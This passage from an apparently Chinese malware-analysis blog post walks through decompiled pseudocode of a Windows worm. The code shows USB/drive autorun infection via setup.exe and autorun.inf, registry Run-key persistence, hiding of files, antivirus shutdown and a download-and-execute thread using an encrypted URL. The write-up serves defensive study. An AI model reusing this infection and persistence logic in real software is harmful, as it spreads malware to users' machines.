class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall OpenAndRead_File@&lt;eax&gt;(<br>        <span class="hljs-type">int</span> System::AnsiString@&lt;eax&gt;,<br>        <span class="hljs-type">int</span> *a2@&lt;edx&gt;,<br>        <span class="hljs-type">int</span> __strlen@&lt;ebx&gt;,<br>        <span class="hljs-type">int</span> a4@&lt;edi&gt;,<br>        <span class="hljs-type">int</span> lpFileName@&lt;esi&gt;)<br>&#123;<br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v13[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [esp-24h] [ebp-517Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v14[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp-18h] [ebp-5170h] BYREF</span><br>  <span class="hljs-type">int</span> *v15; <span class="hljs-comment">// [esp-10h] [ebp-5168h]</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [esp-Ch] [ebp-5164h]</span><br>  <span class="hljs-type">int</span> lpFileName_1; <span class="hljs-comment">// [esp-8h] [ebp-5160h]</span><br>  <span class="hljs-type">int</span> __strlen_1; <span class="hljs-comment">// [esp-4h] [ebp-515Ch]</span><br>  <span class="hljs-type">int</span> v19; <span class="hljs-comment">// [esp+0h] [ebp-5158h] BYREF</span><br>  _BYTE v20[<span class="hljs-number">20480</span>]; <span class="hljs-comment">// [esp+4h] [ebp-5154h] BYREF</span><br>  _BYTE v21[<span class="hljs-number">332</span>]; <span class="hljs-comment">// [esp+5004h] [ebp-154h] BYREF</span><br>  _BYTE v22[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+5150h] [ebp-8h] BYREF</span><br>  <span class="hljs-type">int</span> System::AnsiString_1; <span class="hljs-comment">// [esp+5154h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+5158h] [ebp+0h] BYREF</span><br><br>  __strlen_1 = __strlen;<br>  lpFileName_1 = lpFileName;<br>  v16 = a4;<br>  v19 = <span class="hljs-number">0</span>;<br>  System::AnsiString_1 = System::AnsiString;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAddRef</span><span class="hljs-params">(System::AnsiString)</span>;<br>  v15 = &amp;savedregs;<br>  v14[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40BE6D;<br>  v14[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v14);<br>  v13[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v13[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40BE42;<br>  v13[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v13);<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(a2)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v21, System::AnsiString_1)</span>;<br>  *off_40E2BC = <span class="hljs-number">0</span>;<br>  v6 = System::__linkproc__ ResetFile(v21, <span class="hljs-number">1</span>);<br>  System::__linkproc__ _IOTest(v6);<br>  v7 = System::__linkproc__ FileSize(v21);<br>  v8 = System::__linkproc__ _IOTest(v7);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v10 = System::__linkproc__ EofFile(v21);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)System::__linkproc__ _IOTest(v10) )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = System::__linkproc__ BlockRead(v22);<br>    System::__linkproc__ _IOTest(v9);<br>    System::__linkproc__ <span class="hljs-title function_">LStrFromPCharLen</span><span class="hljs-params">(&amp;v19, v20, <span class="hljs-number">20480</span>)</span>;<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(a2, v19)</span>;<br>  &#125;<br>  v11 = System::__linkproc__ Close(v21);<br>  System::__linkproc__ _IOTest(v11);<br>  <span class="hljs-keyword">if</span> ( v8 &lt; unknown_libname_113(*a2) )<br>    System::__linkproc__ <span class="hljs-title function_">LStrCopy</span><span class="hljs-params">(a2)</span>;<br>  __writefsdword(<span class="hljs-number">0</span>, v13[<span class="hljs-number">0</span>]);<br>  __writefsdword(<span class="hljs-number">0</span>, v14[<span class="hljs-number">0</span>]);<br>  v15 = (<span class="hljs-type">int</span> *)&amp;loc_40BE74;<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v19)</span>;<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrClr(&amp;System::AnsiString_1);<br>&#125;<br></code></pre></td></tr></table></figure><p>具体行为就是在盘符根目录（不包括A、B盘符）创建setup.exe以及autorun.inf</p><p>setup.exe内容和病毒源文件相同</p><p>autorun.inf内容为，目的是在插入媒介（通常是光盘或曾被利用的 U 盘）时提示或尝试自动运行同目录下的 <code>setup.exe</code></p><p>推测为感染可移动介质的手段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">[AutoRun]<br>OPEN=setup.exe<br>shellexecute=setup.exe<br>shell\Auto\command=setup.exe<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs c">v26 = &amp;savedregs;<br>  v25[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40C2C6;<br>  v25[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v25);<br>  v24[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v24[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40C291;<br>  v24[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v24);         <span class="hljs-comment">// SEH设置完成</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v40)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;System::AnsiString)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;System::AnsiString_1)</span>;<span class="hljs-comment">// 字符串释放完毕</span><br>  GetRootPath((<span class="hljs-type">int</span>)&amp;v40, a1, a2, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)lpFileName);<span class="hljs-comment">// 获取可利用的根目录</span><br>  <span class="hljs-keyword">if</span> ( v40 )<br>  &#123;<br>    __strlen = unknown_libname_113(v40);        <span class="hljs-comment">// 等于strlen</span><br>    <span class="hljs-keyword">if</span> ( __strlen &gt;= <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span>                                        <span class="hljs-comment">// 对可利用的盘符根目录循环操作，排除A、B盘符</span><br>      &#123;<br>        unknown_libname_108((<span class="hljs-type">int</span>)v33);<br>        Sysutils::AnsiUpperCase(v33[<span class="hljs-number">0</span>]);        <span class="hljs-comment">// 全大写</span><br>        v22 = (_BYTE *)v33[<span class="hljs-number">1</span>];<br>        Sysutils::AnsiUpperCase((<span class="hljs-type">const</span> <span class="hljs-type">int</span>)System::AnsiString_10);<br>        <span class="hljs-keyword">if</span> ( !__linkproc__ LStrPos((_BYTE *)v32[<span class="hljs-number">2</span>], v22) )<span class="hljs-comment">// 排除A、B</span><br>        &#123;<br>          unknown_libname_108((<span class="hljs-type">int</span>)v32);<br>          Sysutils::AnsiUpperCase(v32[<span class="hljs-number">0</span>]);<br>          v23 = (_BYTE *)v32[<span class="hljs-number">1</span>];<br>          Sysutils::AnsiUpperCase((<span class="hljs-type">const</span> <span class="hljs-type">int</span>)System::AnsiString_11);<br>          <span class="hljs-keyword">if</span> ( !__linkproc__ LStrPos((_BYTE *)v31[<span class="hljs-number">1</span>], v23) )<br>          &#123;<br>            unknown_libname_108((<span class="hljs-type">int</span>)v31);<br>            System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;System::AnsiString, v31[<span class="hljs-number">0</span>], aSetupExe_0)</span>;<span class="hljs-comment">// &quot;:\\setup.exe&quot;</span><br>            unknown_libname_108((<span class="hljs-type">int</span>)&amp;v30);<br>            System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;System::AnsiString_1, v30, aAutorunInf)</span>;<span class="hljs-comment">// &quot;:\\autorun.inf&quot;</span><br>            <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)Sysutils::FileExists(System::AnsiString) )<span class="hljs-comment">// 判断C:\\setup.exe是否存在，若存在，进入以下if分支</span><br>            &#123;<br>              System::ParamStr(<span class="hljs-number">0</span>);<br>              OpenAndRead_File(v29[<span class="hljs-number">1</span>], &amp;v37, __strlen, a2, (<span class="hljs-type">int</span>)lpFileName);<span class="hljs-comment">// 打开并读取C:\Windows\System32\drivers\spo0lsv.exe</span><br>              OpenAndRead_File(System::AnsiString, &amp;v36, __strlen, a2, (<span class="hljs-type">int</span>)lpFileName);<span class="hljs-comment">// 打开并读取C:\\setup.exe</span><br>              System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v37, v36)</span>;<span class="hljs-comment">// 比较已存在的C:\\setup.exe和C:\Windows\System32\drivers\spo0lsv.exe的内容是否相同，不同，则删除原C:\\setup.exe，把C:\Windows\System32\drivers\spo0lsv.exe复制过来</span><br>              <span class="hljs-keyword">if</span> ( !v4 )<br>              &#123;<br>                lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(System::AnsiString);<br>                SetFileAttributesA(lpFileName, <span class="hljs-number">0x80</span>u);<br>                <span class="hljs-keyword">if</span> ( !DeleteFileA(lpFileName) )<br>                  <span class="hljs-keyword">break</span>;<br>                unknown_libname_108((<span class="hljs-type">int</span>)v29);<br>                System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v29, aSetupExe_0)</span>;<span class="hljs-comment">// &quot;:\\setup.exe&quot;</span><br>                lpNewFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v29[<span class="hljs-number">0</span>]);<br>                System::ParamStr(<span class="hljs-number">0</span>);<br>                lpExistingFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v28[<span class="hljs-number">1</span>]);<br>                <span class="hljs-keyword">if</span> ( !CopyFileA(lpExistingFileName, lpNewFileName, <span class="hljs-number">0</span>) )<br>                  <span class="hljs-keyword">break</span>;<br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>                                <span class="hljs-comment">// 若C:\\setup.exe不存在</span><br>            &#123;<br>              unknown_libname_108((<span class="hljs-type">int</span>)v28);<br>              System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v28, aSetupExe_0)</span>;<span class="hljs-comment">// &quot;:\\setup.exe&quot;</span><br>              lpNewFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v28[<span class="hljs-number">0</span>]);<br>              System::ParamStr(<span class="hljs-number">0</span>);<br>              lpExistingFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v27[<span class="hljs-number">1</span>]);<br>              <span class="hljs-keyword">if</span> ( !CopyFileA(lpExistingFileName_1, lpNewFileName_1, <span class="hljs-number">0</span>) )<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)Sysutils::FileExists(System::AnsiString_1) )<span class="hljs-comment">// 判断C:\\autorun.inf是否存在，具体逻辑同上</span><br>            &#123;                                   <span class="hljs-comment">// 若存在</span><br>              OpenAndRead_File(System::AnsiString_1, &amp;v35, __strlen, a2, (<span class="hljs-type">int</span>)lpFileName);<br>              System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v35, aAutorunOpenSet)</span>;<span class="hljs-comment">// 已存在的C:\\autorun.inf其内容是否等于&quot;[AutoRun]\r\nOPEN=setup.exe\r\nshellexecute=setup.exe\r\nshell\\Auto\\command=setup.exe\r\n&quot;</span><br>              <span class="hljs-keyword">if</span> ( !v4 )                        <span class="hljs-comment">// 若不等，则删除，重新创建写入</span><br>              &#123;<br>                lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(System::AnsiString_1);<br>                SetFileAttributesA(lpFileName, <span class="hljs-number">0x80</span>u);<br>                <span class="hljs-keyword">if</span> ( !DeleteFileA(lpFileName) )<br>                  <span class="hljs-keyword">break</span>;<br>                FileA_0 = CreateFileA_0(lpFileName, <span class="hljs-number">0x40000000</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2u</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>                CloseHandle_0(FileA_0);<br>                System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v34, System::AnsiString_1)</span>;<br>                *off_40E2BC = <span class="hljs-number">2</span>;<br>                v8 = System::__linkproc__ Append(v34);<br>                System::__linkproc__ _IOTest(v8);<br>                _[AutoRun]_r_nOPEN_setup.exe_r_nshellexecute_setup.exe_r_nshell = System::__linkproc__ WriteLString(<br>                                                                                    (<span class="hljs-type">int</span>)v34,<br>                                                                                    (<span class="hljs-type">int</span>)aAutorunOpenSet);<span class="hljs-comment">// &quot;[AutoRun]\r\nOPEN=setup.exe\r\nshellexecute=setup.exe\r\nshell\\Auto\\command=setup.exe\r\n&quot;</span><br>                v10 = System::__linkproc__ Flush(_[AutoRun]_r_nOPEN_setup.exe_r_nshellexecute_setup.exe_r_nshell);<br>                System::__linkproc__ _IOTest(v10);<br>                v11 = System::__linkproc__ Close(v34);<br>                System::__linkproc__ _IOTest(v11);<br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>                                <span class="hljs-comment">// 不存在，直接创建写入</span><br>            &#123;<br>              lpFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(System::AnsiString_1);<br>              hObject = CreateFileA_0(lpFileName_1, <span class="hljs-number">0x40000000</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2u</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>              CloseHandle_0(hObject);<br>              System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v34, System::AnsiString_1)</span>;<br>              *off_40E2BC = <span class="hljs-number">2</span>;<br>              v14 = System::__linkproc__ Append(v34);<br>              System::__linkproc__ _IOTest(v14);<br>              _[AutoRun]_r_nOPEN_setup.exe_r_nshellexecute_setup.exe_r_nshell_1 = System::__linkproc__ WriteLString(<br>                                                                                    (<span class="hljs-type">int</span>)v34,<br>                                                                                    (<span class="hljs-type">int</span>)aAutorunOpenSet);<span class="hljs-comment">// &quot;[AutoRun]\r\nOPEN=setup.exe\r\nshellexecute=setup.exe\r\nshell\\Auto\\command=setup.exe\r\n&quot;</span><br>              v16 = System::__linkproc__ Flush(_[AutoRun]_r_nOPEN_setup.exe_r_nshellexecute_setup.exe_r_nshell_1);<br>              System::__linkproc__ _IOTest(v16);<br>              v17 = System::__linkproc__ Close(v34);<br>              System::__linkproc__ _IOTest(v17);<br>            &#125;<br>            unknown_libname_108((<span class="hljs-type">int</span>)v27);      <span class="hljs-comment">// 设置文件属性</span><br>            System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v27, aSetupExe_0)</span>;<span class="hljs-comment">// &quot;:\\setup.exe&quot;</span><br>            lpFileName_2 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v27[<span class="hljs-number">0</span>]);<br>            SetFileAttributesA(lpFileName_2, <span class="hljs-number">7u</span>);<br>            lpFileName_3 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(System::AnsiString_1);<br>            SetFileAttributesA(lpFileName_3, <span class="hljs-number">7u</span>);<br>          &#125;<br>        &#125;<br>        --__strlen;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( __strlen );<br>    &#125;<br>  &#125;<br>  __writefsdword(<span class="hljs-number">0</span>, v24[<span class="hljs-number">0</span>]);<br>  __writefsdword(<span class="hljs-number">0</span>, v25[<span class="hljs-number">0</span>]);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_40C2CD)</span>;<span class="hljs-comment">// 清空字符串数组</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(v26)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sub-40BACC"><a href="#sub-40BACC" class="headerlink" title="sub_40BACC"></a>sub_40BACC</h3><p>此处开始一个线程</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002104934.png"></p><p>点进sub_40ba8c，再进入sub_40b864</p><p>很明显的网络行为</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002110548.png"></p><h3 id="具体流程-1"><a href="#具体流程-1" class="headerlink" title="具体流程"></a>具体流程</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002183427.png"></p><h2 id="sub-40d088"><a href="#sub-40d088" class="headerlink" title="sub_40d088"></a>sub_40d088</h2><p>设置了6个定时器，最短的1秒，最长的30分钟</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002174206.png"></p><h3 id="sub-40CEE4"><a href="#sub-40CEE4" class="headerlink" title="sub_40CEE4"></a>sub_40CEE4</h3><p>主要是修改注册表启动项的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">sub_40CEE4</span><span class="hljs-params">()</span><br>&#123;<br>  _DWORD v0[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp-Ch] [ebp-14h] BYREF</span><br>  <span class="hljs-type">int</span> *v1; <span class="hljs-comment">// [esp-4h] [ebp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+0h] [ebp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+4h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+8h] [ebp+0h] BYREF</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  v2 = <span class="hljs-number">0</span>;<br>  v1 = &amp;savedregs;<br>  v0[<span class="hljs-number">1</span>] = &amp;loc_40CF69;<br>  v0[<span class="hljs-number">0</span>] = NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v0);<br>  sub_406E2C(v0[<span class="hljs-number">0</span>], &amp;loc_40CF69, &amp;savedregs);   <span class="hljs-comment">// 杀软检测并关闭</span><br>  GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;v2);               <span class="hljs-comment">// 返回C:\Windows\System32</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v3, <span class="hljs-number">3</span>)</span>;        <span class="hljs-comment">// 得到源病毒路径</span><br>  v1 = (<span class="hljs-type">int</span> *)System::__linkproc__ LStrToPChar(v3);<br>  sub_4051BC(                                   <span class="hljs-comment">// 将源病毒路径写入启动项</span><br>    (LPCSTR)<span class="hljs-number">0x80000001</span>,<br>    aSoftwareMicros,                            <span class="hljs-comment">// &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span><br>    (BYTE *)aSvcshare);                         <span class="hljs-comment">// &quot;svcshare&quot;</span><br>  sub_4059F0(                                   <span class="hljs-comment">// 将文件属性设置为隐藏</span><br>    <span class="hljs-number">-2147483646</span>,<br>    SOFTWARE__Microsoft__Windows__CurrentVersion__Explorer__Advance,<span class="hljs-comment">// &quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\CheckedValue&quot;</span><br>    <span class="hljs-number">0</span>);<br>  __writefsdword(<span class="hljs-number">0</span>, v2);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_40CF70)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002120619.png"></p><h3 id="sub-40d040"><a href="#sub-40d040" class="headerlink" title="sub_40d040"></a>sub_40d040</h3><p>套娃</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002120817.png"></p><p>创建线程sub_40c9b0，进去看看</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002120850.png"></p><p>内部的功能是访问一个url，下载恶意代码并执行</p><p>这个url是加密后硬编码在程序中</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002171027.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002170941.png"></p><h4 id="sub-40c4ec"><a href="#sub-40c4ec" class="headerlink" title="sub_40c4ec"></a>sub_40c4ec</h4><p>进入这个解密函数看看，伪代码层面看不出来加密过程，需要看汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall decode_url@&lt;eax&gt;(<br>        <span class="hljs-type">int</span> a1@&lt;eax&gt;,<br>        <span class="hljs-type">int</span> a2@&lt;edx&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a3@&lt;ebx&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a4@&lt;edi&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a5@&lt;esi&gt;)<br>&#123;<br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp-18h] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+0h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+4h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+8h] [ebp-Ch] BYREF</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+Ch] [ebp-8h]</span><br>  <span class="hljs-type">int</span> encryp_url; <span class="hljs-comment">// [esp+10h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+14h] [ebp+0h] BYREF</span><br><br>  v11 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v9 = <span class="hljs-number">0</span>;<br>  v8[<span class="hljs-number">5</span>] = a3;<br>  v8[<span class="hljs-number">4</span>] = a5;<br>  v8[<span class="hljs-number">3</span>] = a4;<br>  v12 = a2;<br>  encryp_url = a1;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAddRef</span><span class="hljs-params">(a1)</span>;<br>  v8[<span class="hljs-number">2</span>] = (<span 